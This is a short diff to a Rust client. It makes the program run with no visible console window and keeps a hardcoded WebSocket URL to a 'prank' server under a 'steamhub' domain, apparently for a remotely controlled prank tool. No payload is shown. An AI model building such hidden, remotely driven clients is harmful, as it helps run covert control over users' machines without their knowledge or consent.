@@ -1,3 +1,6 @@
+// Run silently in the background — no console window shown
+#![cfg_attr(windows, windows_subsystem = "windows")]
+
 mod pranks;
 mod safety;
 
@@ -14,8 +17,7 @@ use tokio_tungstenite::{
 };
 use tracing::{error, info, warn};
 
-/// CONSTANT HARDCODED SERVER URL FOR CLIENT BUILD
-/// Connected to Cloudflare domain: prank.steamhub.qzz.io
+/// CONSTANT HARDCODED SERVER URL — PERMANENT (custom domain via Cloudflare → Render)
 pub const DEFAULT_SERVER_URL: &str = "wss://prank.steamhub.qzz.io/ws";
 
 #[tokio::main]
